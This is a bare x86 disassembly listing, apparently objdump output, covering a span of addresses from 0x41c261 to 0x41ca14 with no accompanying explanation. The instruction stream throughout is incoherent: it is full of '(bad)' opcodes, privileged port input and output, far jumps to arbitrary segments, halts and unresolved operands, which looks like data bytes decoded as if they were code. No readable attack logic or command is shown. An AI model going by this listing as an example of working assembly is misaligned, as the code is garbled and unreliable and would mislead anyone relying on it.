  41c261:	js     0x41c1eb
  41c263:	xchg   esi,eax
  41c264:	scas   eax,DWORD PTR es:[edi]
  41c265:	xchg   esi,eax
  41c266:	dec    ebp
  41c267:	div    DWORD PTR [eax-0x3b]
  41c26a:	test   al,0x2e
  41c26c:	lock je 0x41c22f
  41c26f:	ret    
  41c270:	pop    ss
  41c271:	mov    edx,0xfcde74d3
  41c276:	scas   eax,DWORD PTR es:[edi]
  41c277:	addr16 cli 
  41c279:	mov    ebp,0xf1099169
  41c27e:	mov    al,ds:0xf58b38fe
  41c283:	and    BYTE PTR [esi-0x7c],dh
  41c286:	adc    ebp,DWORD PTR [ebx+ebp*2]
  41c289:	or     BYTE PTR [edx],0xe9
  41c28c:	je     0x41c261
  41c28e:	mov    bl,0x6
  41c290:	out    dx,al
  41c291:	mov    edx,0x99c4fa31
  41c296:	das    
  41c297:	(bad)  
  41c298:	ds inc ecx
  41c29a:	adc    ebx,eax
  41c29c:	mov    dl,0x3e
  41c29e:	test   al,0x69
  41c2a0:	inc    esi
  41c2a1:	jecxz  0x41c22b
  41c2a3:	jecxz  0x41c2ba
  41c2a5:	push   cs
  41c2a6:	dec    ebp
  41c2a7:	mov    bl,0x7d
  41c2a9:	loopne 0x41c2ef
  41c2ab:	out    dx,eax
  41c2ac:	xor    BYTE PTR [ebx-0x4b],bh
  41c2af:	in     al,0x25
  41c2b1:	mov    ebp,0xc9fd36a
  41c2b6:	xor    edx,eax
  41c2b8:	les    edi,FWORD PTR [esi-0xf16df22]
  41c2be:	ret    
  41c2bf:	adc    al,ch
  41c2c1:	cmp    DWORD PTR [edi],ecx
  41c2c3:	add    eax,0x1e42f2e3
  41c2c8:	add    ebp,0xaec61abe
  41c2ce:	rol    dl,cl
  41c2d0:	outs   dx,WORD PTR ds:[esi]
  41c2d2:	xor    eax,DWORD PTR [edi+0x54d13867]
  41c2d8:	jb     0x41c322
  41c2da:	pop    edi
  41c2db:	repz mov al,0x89
  41c2de:	xor    BYTE PTR [edi],dh
  41c2e0:	sahf   
  41c2e1:	sbb    DWORD PTR [ebx-0x2f],esp
  41c2e4:	inc    eax
  41c2e5:	or     eax,0x776a305e
  41c2ea:	jae    0x41c327
  41c2ec:	mov    ecx,0x243249
  41c2f1:	push   0x39242054
  41c2f6:	nop
  41c2f7:	cdq    
  41c2f8:	and    dh,bl
  41c2fa:	fld    DWORD PTR [ebp-0x311ee7e]
  41c300:	xor    BYTE PTR [eax],al
  41c302:	repnz out dx,al
  41c304:	out    0x83,eax
  41c306:	dec    ebx
  41c307:	out    0xc5,eax
  41c309:	pushf  
  41c30a:	gs mov dl,0xe4
  41c30d:	retf   
  41c30e:	xor    DWORD PTR [edi],0x9ec08716
  41c314:	adc    ecx,0xe8ae12ec
  41c31a:	push   ds
  41c31b:	add    al,0x5
  41c31d:	inc    esi
  41c31e:	inc    edx
  41c31f:	mov    bl,0x76
  41c321:	scas   al,BYTE PTR es:[edi]
  41c322:	push   edi
  41c323:	dec    edi
  41c324:	adc    DWORD PTR [ebx-0xb],esp
  41c327:	mov    bl,0x40
  41c329:	addr16 mov edi,0x5c7d60b2
  41c32f:	rol    DWORD PTR [eax+eiz*1],1
  41c332:	das    
  41c333:	fist   DWORD PTR [ebx+0x497735b2]
  41c339:	mov    eax,ds:0xdfe9413b
  41c33e:	test   edi,edi
  41c340:	or     al,0xdb
  41c342:	loopne 0x41c36c
  41c344:	aas    
  41c345:	push   cs
  41c346:	test   al,0x1
  41c348:	sahf   
  41c349:	adc    al,0xff
  41c34b:	adc    eax,0x391f1931
  41c350:	rcr    dh,0xf8
  41c353:	xchg   ebp,eax
  41c354:	sub    edi,esi
  41c356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c357:	imul   ebx,DWORD PTR [edi*2+0x12b9a829],0xfffffff5
  41c35f:	mov    ch,0x1a
  41c361:	mov    dl,0x28
  41c363:	sbb    al,0x5b
  41c365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c366:	loopne 0x41c3a8
  41c368:	pop    ds
  41c369:	fnsave [eax]
  41c36b:	adc    BYTE PTR [ecx+eax*2],dh
  41c36e:	fs test al,0xd2
  41c371:	mov    bl,0x8
  41c373:	repnz inc ecx
  41c375:	cmc    
  41c376:	cmp    eax,0x60d9c8e5
  41c37b:	adc    al,BYTE PTR [edx+0x21]
  41c37e:	jb     0x41c34c
  41c380:	xchg   ecx,eax
  41c381:	xchg   BYTE PTR [ebp-0x77],dh
  41c384:	imul   ecx,DWORD PTR [edi-0x67],0xffffffcb
  41c388:	aam    0xcf
  41c38a:	cwde   
  41c38b:	push   es
  41c38c:	push   0x43
  41c38e:	or     BYTE PTR [esi],bh
  41c390:	fisttp WORD PTR [ebx+0x627b7640]
  41c396:	(bad)  
  41c397:	jb     0x41c365
  41c399:	pusha  
  41c39a:	jns    0x41c395
  41c39c:	dec    esi
  41c39d:	dec    esp
  41c39e:	and    eax,0xc6a0f5e7
  41c3a3:	cmp    eax,0xe101aa38
  41c3a8:	push   es
  41c3a9:	loop   0x41c3ae
  41c3ab:	sbb    al,0xe1
  41c3ad:	(bad)  
  41c3ae:	fisub  WORD PTR [edi+0x58cb1707]
  41c3b4:	outs   dx,BYTE PTR ds:[esi]
  41c3b5:	dec    edi
  41c3b6:	jg     0x41c3b8
  41c3b8:	pop    ds
  41c3b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ba:	rcl    bh,1
  41c3bc:	jnp    0x41c38a
  41c3be:	fld    QWORD PTR [esi]
  41c3c0:	test   esp,edx
  41c3c2:	jb     0x41c3ff
  41c3c4:	pop    esi
  41c3c5:	jnp    0x41c3cc
  41c3c7:	xchg   edx,eax
  41c3c8:	sbb    esp,DWORD PTR [esi+0x1f]
  41c3cb:	add    DWORD PTR [edx+0xc7c3c56],0x4
  41c3d2:	fdivr  st,st(3)
  41c3d4:	dec    edi
  41c3d5:	sub    al,0xf2
  41c3d7:	lea    ebx,[ecx+ebx*8+0x58]
  41c3db:	cs lock fucomip st,st(0)
  41c3df:	push   0xcf03a346
  41c3e4:	mov    bh,0x2
  41c3e6:	push   eax
  41c3e7:	mov    ecx,DWORD PTR [ebx]
  41c3e9:	or     dh,BYTE PTR [eax+eax*2+0x473d4]
  41c3f0:	or     DWORD PTR ds:0x31a913a0,eax
  41c3f6:	mov    cl,0x31
  41c3f8:	jp     0x41c411
  41c3fa:	mov    WORD PTR [ebp-0x699ef97c],ds
  41c400:	enter  0x9ab4,0xce
  41c404:	cmp    esp,DWORD PTR [edi+eiz*2]
  41c407:	repnz pop ecx
  41c409:	inc    BYTE PTR [ebx+0x12ef4483]
  41c40f:	cmp    DWORD PTR [edi+0x1b],eax
  41c412:	cs popf 
  41c414:	mov    edi,0x7e8a6f4b
  41c419:	(bad)  
  41c41a:	mov    esp,0x1ebceea0
  41c41f:	pop    ebp
  41c420:	push   es
  41c421:	mov    ebx,0x459af97c
  41c426:	sub    BYTE PTR [edi],dh
  41c428:	neg    BYTE PTR [edi]
  41c42a:	ins    DWORD PTR es:[edi],dx
  41c42b:	fbstp  TBYTE PTR gs:[ebp+0x12]
  41c42f:	scas   al,BYTE PTR es:[edi]
  41c430:	mov    DWORD PTR [edx-0x7aaccb42],ebx
  41c436:	pop    ebx
  41c437:	push   0xb70dd3af
  41c43c:	pop    ebx
  41c43d:	and    BYTE PTR [esi],ch
  41c43f:	lock sub ah,BYTE PTR [ecx]
  41c442:	inc    esp
  41c443:	or     al,0x9c
  41c445:	mov    al,ds:0xc1f1f693
  41c44a:	xchg   DWORD PTR [ebx-0x3],ebp
  41c44d:	mov    ah,0x2d
  41c44f:	mov    ds:0x1374108d,eax
  41c454:	test   al,0x17
  41c456:	and    dl,BYTE PTR [esi-0x5de26d39]
  41c45c:	or     eax,0x66674b7c
  41c461:	mov    al,0x9c
  41c463:	mov    ebx,0x9d50ff85
  41c468:	imul   DWORD PTR [edi+esi*2-0x4f]
  41c46c:	loope  0x41c41b
  41c46e:	mul    BYTE PTR [esi+0x57]
  41c471:	bsf    esp,edx
  41c474:	iret   
  41c475:	in     eax,dx
  41c476:	or     eax,DWORD PTR [edx]
  41c478:	rcl    DWORD PTR [esi],0x2e
  41c47b:	adc    DWORD PTR [ebx-0x7357fea0],ebp
  41c481:	xchg   ebp,eax
  41c482:	jge    0x41c4ab
  41c484:	stc    
  41c485:	js     0x41c438
  41c487:	mov    ebp,0x28a67d5e
  41c48c:	pop    eax
  41c48d:	loope  0x41c4f1
  41c48f:	inc    ebp
  41c490:	out    0x8b,al
  41c492:	pop    ebp
  41c493:	xor    esi,ebx
  41c495:	pop    ss
  41c496:	std    
  41c497:	xor    bl,BYTE PTR [ebx-0x4623ec6e]
  41c49d:	mov    esp,0x3d79aa65
  41c4a2:	inc    ebx
  41c4a3:	(bad)  
  41c4a4:	scas   eax,DWORD PTR es:[edi]
  41c4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4a6:	mov    bl,0x7b
  41c4a8:	or     ebp,ebp
  41c4aa:	push   esp
  41c4ab:	sbb    ch,BYTE PTR [edx-0x45]
  41c4ae:	jmp    0xbbce05e4
  41c4b3:	and    eax,0x480e31c4
  41c4b8:	adc    al,0xee
  41c4ba:	imul   eax,DWORD PTR [eax],0x73
  41c4bd:	dec    ebx
  41c4be:	test   al,0x93
  41c4c0:	xchg   ebx,eax
  41c4c1:	out    0xc7,al
  41c4c3:	pop    ebx
  41c4c4:	adc    edi,DWORD PTR [edx-0x434f674c]
  41c4ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4cb:	cmp    BYTE PTR ds:0xe26a605b,bl
  41c4d1:	push   ss
  41c4d2:	fwait
  41c4d3:	mov    al,ds:0x72a7e3f2
  41c4d8:	loop   0x41c532
  41c4da:	std    
  41c4db:	or     BYTE PTR [esp+eiz*8-0x62b018a3],bh
  41c4e2:	in     eax,dx
  41c4e3:	jns    0x41c553
  41c4e5:	mov    cl,0x50
  41c4e7:	xchg   ebp,eax
  41c4e8:	je     0x41c4aa
  41c4ea:	mov    dl,0x1f
  41c4ec:	inc    ebp
  41c4ed:	jp     0x41c51f
  41c4ef:	pop    edi
  41c4f0:	fsub   QWORD PTR [eax-0x11]
  41c4f3:	pop    eax
  41c4f4:	repz shl BYTE PTR [esi-0x71],cl
  41c4f8:	push   cs
  41c4f9:	in     eax,dx
  41c4fa:	lods   al,BYTE PTR ds:[esi]
  41c4fb:	and    al,0xfa
  41c4fd:	push   esi
  41c4fe:	or     dl,ch
  41c500:	push   edx
  41c501:	jmp    0xb681:0xda529343
  41c508:	and    ah,0x7f
  41c50b:	mov    ecx,0x9c58497f
  41c510:	das    
  41c511:	push   ds
  41c512:	lds    edi,FWORD PTR [ebp+eiz*1+0x20]
  41c516:	pop    ebp
  41c517:	int    0x7c
  41c519:	test   eax,0xc6cf5adf
  41c51e:	push   0xc9fda3f4
  41c523:	popf   
  41c524:	mov    esi,0x1a22338b
  41c529:	call   FWORD PTR [ebx-0x79317890]
  41c52f:	pusha  
  41c530:	pushf  
  41c531:	push   ebp
  41c532:	or     eax,0x93f8d9f8
  41c537:	fsub   QWORD PTR [ebp+0x3b]
  41c53a:	aaa    
  41c53b:	sbb    eax,DWORD PTR [edx]
  41c53d:	ret    
  41c53e:	push   es
  41c53f:	scas   al,BYTE PTR es:[edi]
  41c540:	push   esp
  41c541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c542:	xor    dl,0xc8
  41c545:	mov    WORD PTR ds:0xc5a82356,?
  41c54b:	mov    esp,0xa5d761ac
  41c550:	inc    esp
  41c551:	bound  ebp,QWORD PTR [esi-0x51]
  41c554:	aas    
  41c555:	pop    ss
  41c556:	xchg   BYTE PTR [eax],dl
  41c558:	mov    ds:0x2f196232,al
  41c55d:	call   0xd9ef:0x544ad50f
  41c564:	ja     0x41c544
  41c566:	or     DWORD PTR [eax],eax
  41c568:	ja     0x41c580
  41c56a:	push   eax
  41c56b:	xchg   esp,ecx
  41c56d:	or     eax,0x4e0335fc
  41c572:	dec    eax
  41c573:	sbb    esp,0xffffff99
  41c576:	js     0x41c5c8
  41c578:	(bad)  
  41c579:	jo     0x41c589
  41c57b:	test   DWORD PTR [ebx-0x3f],edi
  41c57e:	dec    ecx
  41c57f:	mov    WORD PTR [eax+0x3b],cs
  41c582:	pop    edi
  41c583:	fidiv  DWORD PTR [eax-0xc]
  41c586:	std    
  41c587:	(bad)  
  41c588:	mov    ebp,0x152fdb1a
  41c58d:	lods   eax,DWORD PTR ds:[esi]
  41c58e:	push   ss
  41c58f:	je     0x41c550
  41c591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c592:	cdq    
  41c593:	or     edx,DWORD PTR [esi]
  41c595:	in     eax,dx
  41c596:	loope  0x41c59a
  41c598:	not    BYTE PTR [ebp+0x45]
  41c59b:	test   bl,cl
  41c59d:	push   ecx
  41c59e:	dec    ebp
  41c59f:	fadd   DWORD PTR [ebp-0x463b1aaa]
  41c5a5:	cld    
  41c5a6:	cli    
  41c5a7:	adc    esi,eax
  41c5a9:	cmp    DWORD PTR ds:0xf314fc2e,0x2aa78e2a
  41c5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b4:	sub    eax,0xbf902bad
  41c5b9:	cmp    BYTE PTR [edi+0x734ede2b],bl
  41c5bf:	cmp    eax,0x44c8d645
  41c5c4:	pop    ss
  41c5c5:	jae    0x41c5d1
  41c5c7:	jp     0x41c594
  41c5c9:	ins    BYTE PTR es:[edi],dx
  41c5ca:	push   esp
  41c5cb:	xchg   ebx,eax
  41c5cc:	and    ah,bh
  41c5ce:	mov    ds:0x3a22c0c1,eax
  41c5d3:	jne    0x41c5e3
  41c5d5:	adc    al,0xd9
  41c5d7:	add    ebx,ebx
  41c5d9:	cmp    BYTE PTR [ecx],dl
  41c5db:	pop    ecx
  41c5dc:	jl     0x41c56f
  41c5de:	dec    eax
  41c5df:	stos   BYTE PTR es:[edi],al
  41c5e0:	mov    eax,ds:0x6cdfda70
  41c5e5:	cmp    edx,DWORD PTR [esi+0x5a9eaa5d]
  41c5eb:	add    al,0x93
  41c5ed:	cmp    edx,0xffffff9f
  41c5f0:	mov    ds:0x382ffb12,al
  41c5f5:	jns    0x41c5c0
  41c5f7:	aad    0x7f
  41c5f9:	loopne 0x41c590
  41c5fb:	cmp    DWORD PTR [ecx],0xbae091ec
  41c601:	xor    BYTE PTR es:[esi*1+0x6eaed752],dl
  41c609:	inc    eax
  41c60a:	in     al,dx
  41c60b:	cmp    al,0x24
  41c60d:	pusha  
  41c60e:	in     eax,0x40
  41c610:	mov    eax,DWORD PTR [ebx-0x6f2056cc]
  41c616:	out    0x4c,eax
  41c618:	mov    cl,BYTE PTR [edx+0x18]
  41c61b:	fs test esp,eax
  41c61e:	or     edi,DWORD PTR [edi-0x60]
  41c621:	fcom   QWORD PTR [edi]
  41c623:	(bad)  
  41c624:	out    0xc4,al
  41c626:	cdq    
  41c627:	es sub eax,0x7fa7c528
  41c62d:	adc    edx,edi
  41c62f:	int    0x76
  41c631:	shl    DWORD PTR [ebp+0x61c8d176],cl
  41c637:	mov    cl,0x33
  41c639:	mov    ?,WORD PTR [edi+0x41e3f7db]
  41c63f:	mov    esi,0xc3fb85c5
  41c644:	push   ds
  41c645:	pop    esp
  41c646:	je     0x41c607
  41c648:	cs call 0x543d:0xc55af3be
  41c650:	cmp    DWORD PTR [edi-0x2ea81990],edx
  41c656:	sbb    al,0x5e
  41c658:	out    dx,eax
  41c659:	bound  esi,QWORD PTR [ebx+0x56]
  41c65c:	repz ss cmp al,0x7c
  41c660:	std    
  41c661:	push   esp
  41c662:	jne    0x41c63a
  41c664:	bound  esp,QWORD PTR [ebx-0x42443605]
  41c66a:	hlt    
  41c66b:	cwde   
  41c66c:	clc    
  41c66d:	fcmovu st,st(4)
  41c66f:	enter  0x9802,0x1c
  41c673:	sbb    dl,al
  41c675:	jg     0x41c6b9
  41c677:	add    esp,DWORD PTR [ebp+0x3db5fae1]
  41c67d:	xchg   esp,eax
  41c67e:	sub    al,0x7f
  41c680:	sbb    eax,0x616fefb7
  41c685:	addr16 xchg edi,eax
  41c687:	inc    edi
  41c688:	es call 0x5fccd479
  41c68e:	jmp    0x1f66:0xe9dc4d04
  41c695:	call   0x2f9d7f0a
  41c69a:	jg     0x41c664
  41c69c:	es icebp 
  41c69e:	out    0xf,eax
  41c6a0:	popa   
  41c6a1:	xchg   ecx,eax
  41c6a2:	data16 daa 
  41c6a4:	jmp    0x41c6b1
  41c6a6:	mov    dh,0xf5
  41c6a8:	cwde   
  41c6a9:	test   BYTE PTR [ecx],cl
  41c6ab:	div    DWORD PTR [ecx+0x6abda1d9]
  41c6b1:	sbb    BYTE PTR [edi],ah
  41c6b3:	xor    BYTE PTR [eax+0x8026635],bh
  41c6b9:	fadd   QWORD PTR [esi]
  41c6bb:	int    0x56
  41c6bd:	and    al,0x93
  41c6bf:	int3   
  41c6c0:	nop
  41c6c1:	test   eax,0xdf692ab6
  41c6c6:	imul   esi,DWORD PTR [ecx+0x15],0x49
  41c6ca:	test   al,0x4
  41c6cc:	pop    esp
  41c6cd:	daa    
  41c6ce:	add    dl,BYTE PTR [edi]
  41c6d0:	jle    0x41c6d9
  41c6d2:	inc    eax
  41c6d3:	ins    DWORD PTR es:[edi],dx
  41c6d4:	and    al,0xe
  41c6d6:	test   BYTE PTR [ebx+0x3b49d486],dl
  41c6dc:	jmp    0x31b53335
  41c6e1:	retf   
  41c6e2:	rol    ebp,cl
  41c6e4:	jne    0x41c6f1
  41c6e6:	test   bh,bl
  41c6e8:	sahf   
  41c6e9:	hlt    
  41c6ea:	mov    bl,0x4b
  41c6ec:	xor    al,0x40
  41c6ee:	inc    ecx
  41c6ef:	push   ebp
  41c6f0:	js     0x41c6d5
  41c6f2:	push   ss
  41c6f3:	out    dx,al
  41c6f4:	pop    ebx
  41c6f5:	repnz (bad) 
  41c6f7:	call   0xb90c:0x9e416417
  41c6fe:	jmp    0x3800d722
  41c703:	lahf   
  41c704:	ja     0x41c72b
  41c706:	push   ss
  41c707:	call   DWORD PTR [edi+eiz*8]
  41c70a:	jbe    0x41c69b
  41c70c:	cwde   
  41c70d:	cmp    eax,0xbff27ad6
  41c712:	mov    al,0xa7
  41c714:	jge    0x41c6c1
  41c716:	fidivr DWORD PTR [eax]
  41c718:	int3   
  41c719:	sti    
  41c71a:	ror    BYTE PTR [ecx],1
  41c71c:	cld    
  41c71d:	ret    0xd9c
  41c720:	push   cs
  41c721:	and    eax,0xa4f63e26
  41c726:	in     al,0x16
  41c728:	xchg   edi,eax
  41c729:	jnp    0x41c750
  41c72b:	jno    0x41c756
  41c72d:	fidiv  WORD PTR ds:0xa01394af
  41c733:	retf   
  41c734:	cmp    eax,0x608a25f2
  41c739:	ret    
  41c73a:	repz push edi
  41c73c:	jae    0x41c710
  41c73e:	jge    0x41c728
  41c740:	mov    dh,0x8e
  41c742:	mov    esp,0x272b89e3
  41c747:	(bad)  
  41c749:	jo     0x41c71c
  41c74b:	push   ecx
  41c74c:	and    al,0x5c
  41c74e:	imul   ebp,DWORD PTR [edi+ebp*4-0x5a03adeb],0x4ecfc4ec
  41c759:	cwde   
  41c75a:	out    dx,al
  41c75b:	(bad)  [esi+0x74]
  41c75e:	jae    0x41c797
  41c760:	and    eax,0xdfcb6dd0
  41c765:	adc    DWORD PTR [ecx-0x50053c40],0x1115e887
  41c76f:	cld    
  41c770:	clc    
  41c771:	jbe    0x41c777
  41c773:	adc    ebp,DWORD PTR [esi*1-0x515270ed]
  41c77a:	repnz mov eax,0x581bc41a
  41c780:	mov    esi,0x7f2fecaf
  41c785:	mov    dh,BYTE PTR [ecx+0x46b81141]
  41c78b:	sub    ebx,DWORD PTR [eax+0x7c80a81c]
  41c791:	outs   dx,DWORD PTR ds:[esi]
  41c792:	and    bh,BYTE PTR [edi+0x10]
  41c795:	mov    DWORD PTR [edx+0xa70726a],edi
  41c79b:	sar    WORD PTR [esi+0x2237b8c9],cl
  41c7a2:	mov    ch,0x78
  41c7a4:	inc    eax
  41c7a5:	retf   
  41c7a6:	lods   eax,DWORD PTR ds:[esi]
  41c7a7:	inc    esp
  41c7a8:	jmp    0xbef8:0x2a5409e0
  41c7af:	pop    ds
  41c7b0:	lods   al,BYTE PTR ds:[esi]
  41c7b1:	sub    edi,DWORD PTR [ecx+esi*2-0x349c015d]
  41c7b8:	cmp    DWORD PTR [edi+edi*2-0x12],edx
  41c7bc:	sbb    BYTE PTR es:[ebx+eiz*8],al
  41c7c0:	sub    al,0x9d
  41c7c2:	outs   dx,BYTE PTR ds:[esi]
  41c7c3:	mov    esp,0x37c7ad70
  41c7c8:	pop    ecx
  41c7c9:	call   0x1740c90c
  41c7ce:	adc    BYTE PTR [edx],bl
  41c7d0:	mov    al,ds:0x1206e32b
  41c7d5:	xchg   edx,eax
  41c7d6:	xor    ah,BYTE PTR [ecx]
  41c7d8:	and    dh,BYTE PTR [edi+0x3f]
  41c7db:	jp     0x41c841
  41c7dd:	gs xchg esp,eax
  41c7df:	daa    
  41c7e0:	xor    al,bh
  41c7e2:	outs   dx,BYTE PTR ds:[esi]
  41c7e3:	mov    ds:0x3b271732,eax
  41c7e8:	pop    esi
  41c7e9:	cmp    ecx,DWORD PTR [edx+0x53]
  41c7ec:	pop    eax
  41c7ed:	pop    ebx
  41c7ee:	sahf   
  41c7ef:	jle    0x41c832
  41c7f1:	xchg   ebp,eax
  41c7f2:	shl    BYTE PTR [ecx+ecx*1-0x38],0xac
  41c7f7:	adc    DWORD PTR [edi],eax
  41c7f9:	jl     0x41c7d4
  41c7fb:	mov    edx,0x12050652
  41c800:	dec    BYTE PTR [edi]
  41c802:	rcr    DWORD PTR [edx+0x58],cl
  41c805:	jle    0x41c7ae
  41c807:	cli    
  41c808:	pusha  
  41c809:	imul   esi,DWORD PTR [ecx+0x587ee4a4],0xfb49fff8
  41c813:	loop   0x41c818
  41c815:	jno    0x41c7f8
  41c817:	not    BYTE PTR [eax-0x2a3a8314]
  41c81d:	test   BYTE PTR [eax+ebx*8-0x80],al
  41c821:	addr16 call 0xbe4:0xe28552d1
  41c829:	icebp  
  41c82a:	lods   eax,DWORD PTR ds:[esi]
  41c82b:	jg     0x41c7ec
  41c82d:	mov    ds:0xb16419bb,al
  41c832:	push   ecx
  41c833:	xor    DWORD PTR [esi+0x7e],0x1e67c087
  41c83a:	add    edi,esp
  41c83c:	push   ebp
  41c83d:	stos   DWORD PTR es:[edi],eax
  41c83e:	mov    bh,0xdf
  41c840:	das    
  41c841:	mov    cl,0xb2
  41c843:	xchg   dl,dl
  41c845:	inc    ecx
  41c846:	cwde   
  41c847:	fcom   QWORD PTR [esi]
  41c849:	xchg   DWORD PTR [eax+ecx*4+0x28],edi
  41c84d:	add    al,0xe1
  41c84f:	xor    ebp,DWORD PTR [esi]
  41c851:	dec    esp
  41c852:	push   esp
  41c853:	shr    BYTE PTR [esi-0xafac1fc],cl
  41c859:	test   BYTE PTR [edx+ecx*2-0x69c757e],0xae
  41c861:	jmp    0x2dedaac0
  41c866:	fld    DWORD PTR [esi-0x36]
  41c869:	jecxz  0x41c8c7
  41c86b:	jle    0x41c822
  41c86d:	retf   
  41c86e:	mov    ebx,0x31f73b5a
  41c873:	push   ebp
  41c874:	stc    
  41c875:	loop   0x41c889
  41c877:	jmp    0xd650:0xfcc2ab90
  41c87e:	mov    dl,0xda
  41c880:	adc    dl,ch
  41c882:	jge    0x41c85f
  41c884:	and    BYTE PTR [ebx-0x51],al
  41c887:	popf   
  41c888:	jne    0x41c876
  41c88a:	jno    0x41c81f
  41c88c:	scas   eax,DWORD PTR es:[edi]
  41c88d:	pop    edx
  41c88e:	sub    DWORD PTR [ebp+0xf],0xaec8fcee
  41c895:	rcr    BYTE PTR [esi+0x5cb9a8bb],cl
  41c89b:	jno    0x41c8ce
  41c89d:	cmp    cl,BYTE PTR [ebx]
  41c89f:	or     eax,0x9681072e
  41c8a4:	push   ds
  41c8a5:	mov    edx,0xb7fb23d5
  41c8aa:	xor    al,bh
  41c8ac:	and    BYTE PTR [ecx+0x3e0abe28],ch
  41c8b2:	jg     0x41c8f4
  41c8b4:	in     al,0x43
  41c8b6:	cmp    BYTE PTR [edi],ch
  41c8b8:	mov    al,ds:0xa484fad8
  41c8bd:	inc    edi
  41c8be:	cmp    BYTE PTR [edi],al
  41c8c0:	sub    DWORD PTR [edi+0x54625a36],0x3facf823
  41c8ca:	adc    eax,0xb80222ac
  41c8cf:	jns    0x41c8b2
  41c8d1:	(bad)  
  41c8d2:	int    0xd5
  41c8d4:	ja     0x41c911
  41c8d6:	or     esi,DWORD PTR [edx]
  41c8d8:	lds    si,DWORD PTR [ecx+0x6481ca62]
  41c8df:	cdq    
  41c8e0:	ss push 0xc9b33409
  41c8e6:	xor    BYTE PTR [bp+0x5249],al
  41c8eb:	xchg   ecx,eax
  41c8ec:	fimul  WORD PTR [edi]
  41c8ee:	push   ebp
  41c8ef:	jns    0x41c884
  41c8f1:	dec    eax
  41c8f2:	jl     0x41c8de
  41c8f4:	aaa    
  41c8f5:	cmp    eax,0x60379ad6
  41c8fa:	rcpps  xmm3,xmm7
  41c8fd:	imul   ebp,DWORD PTR [esi],0xc1310c0b
  41c903:	cmp    bh,bh
  41c905:	jp     0x41c88a
  41c907:	sub    DWORD PTR [edi],esp
  41c909:	pop    esp
  41c90a:	mov    bh,0x85
  41c90c:	cmp    BYTE PTR [edi+esi*1+0x3126ee6f],ch
  41c913:	ror    BYTE PTR [esi],0xa8
  41c916:	cmp    esp,DWORD PTR [esi-0x3a]
  41c919:	(bad)
  41c91d:	sub    ch,BYTE PTR [edx+0x72]
  41c920:	loop   0x41c981
  41c922:	adc    DWORD PTR [edi+0x52],ebp
  41c925:	pop    esi
  41c926:	popa   
  41c927:	and    dl,BYTE PTR [esi-0x4a923e54]
  41c92d:	shr    DWORD PTR [ecx-0x62],1
  41c930:	jle    0x41c931
  41c932:	hlt    
  41c933:	xor    dl,al
  41c935:	pop    edi
  41c936:	mov    ah,0xa6
  41c938:	jmp    0x41c920
  41c93a:	xor    esi,DWORD PTR [ebx]
  41c93c:	int    0x4
  41c93e:	mov    ecx,edx
  41c940:	jge    0x41c922
  41c942:	mov    cl,0x97
  41c944:	lods   eax,DWORD PTR ds:[esi]
  41c945:	jg     0x41c917
  41c947:	and    cl,BYTE PTR [ecx-0x21]
  41c94a:	neg    dl
  41c94c:	test   eax,0xdca5a1e
  41c951:	int    0xd1
  41c953:	loope  0x41c8ec
  41c955:	push   ecx
  41c956:	aam    0x94
  41c958:	mov    edi,0xe9ce483c
  41c95d:	mov    dl,0x8
  41c95f:	test   edi,edi
  41c961:	(bad)  
  41c962:	jmp    0xfe5ad167
  41c967:	or     eax,esi
  41c969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c96a:	jmp    DWORD PTR [edi-0x672d1f30]
  41c970:	and    esi,DWORD PTR [ebx+0x185cef60]
  41c976:	aaa    
  41c977:	dec    ecx
  41c978:	inc    esp
  41c979:	dec    ebx
  41c97a:	mov    ds:0xbf31fe9,eax
  41c97f:	jbe    0x41c949
  41c981:	out    dx,eax
  41c982:	and    ebx,DWORD PTR [eax+edx*8]
  41c985:	pop    ds
  41c986:	test   esp,esi
  41c988:	cmp    esp,ebx
  41c98a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c98b:	xor    eax,0x3ca2b507
  41c990:	mov    ds:0xe0156888,eax
  41c995:	pop    esp
  41c996:	std    
  41c997:	jmp    0xa246:0x9d7467be
  41c99e:	mov    cs,WORD PTR [esi+0x187cf7c5]
  41c9a4:	arpl   WORD PTR [ecx],sp
  41c9a6:	stos   DWORD PTR es:[edi],eax
  41c9a7:	pop    edi
  41c9a8:	mov    esp,0x1c648b8c
  41c9ad:	rcl    DWORD PTR [ecx+0x372f7067],cl
  41c9b3:	mov    al,0x3c
  41c9b5:	fild   WORD PTR [edx]
  41c9b7:	shl    ebx,cl
  41c9b9:	jge    0x41c9d6
  41c9bb:	mov    cl,cl
  41c9bd:	or     ebx,0x50
  41c9c0:	adc    BYTE PTR [eax+ecx*4],ch
  41c9c3:	(bad)  
  41c9c4:	in     eax,dx
  41c9c5:	sti    
  41c9c6:	add    DWORD PTR [edx-0x76],ecx
  41c9c9:	rcr    dl,0x2e
  41c9cc:	icebp  
  41c9cd:	mov    esp,0x439a9633
  41c9d2:	jge    0x41ca4c
  41c9d4:	jno    0x41c979
  41c9d6:	lds    ebx,FWORD PTR ds:0xf7f6eb9
  41c9dc:	dec    ebx
  41c9dd:	xchg   ecx,eax
  41c9de:	mov    eax,0xd529d85c
  41c9e3:	push   es
  41c9e4:	xchg   ebp,eax
  41c9e5:	push   esi
  41c9e6:	ins    DWORD PTR es:[edi],dx
  41c9e7:	pop    esp
  41c9e8:	sar    DWORD PTR [edi],0x4c
  41c9eb:	jb     0x41ca13
  41c9ed:	dec    ebx
  41c9ee:	jp     0x41ca51
  41c9f0:	jno    0x41c9be
  41c9f2:	cs add eax,0xce10d816
  41c9f8:	mov    ebp,0x9def0aaa
  41c9fd:	cli    
  41c9fe:	sbb    bh,dh
  41ca00:	lock scas eax,DWORD PTR es:[edi]
  41ca02:	push   ecx
  41ca03:	clc    
  41ca04:	push   ss
  41ca05:	add    eax,0x1f0000a0
  41ca0a:	or     DWORD PTR [edx],eax
  41ca0c:	xchg   esp,eax
  41ca0d:	hlt    
  41ca0e:	xor    bh,BYTE PTR [edx]
  41ca10:	in     eax,0xf0
  41ca12:	popf   
  41ca13:	pop    edx
  41ca14:	mov    cl,0x3f
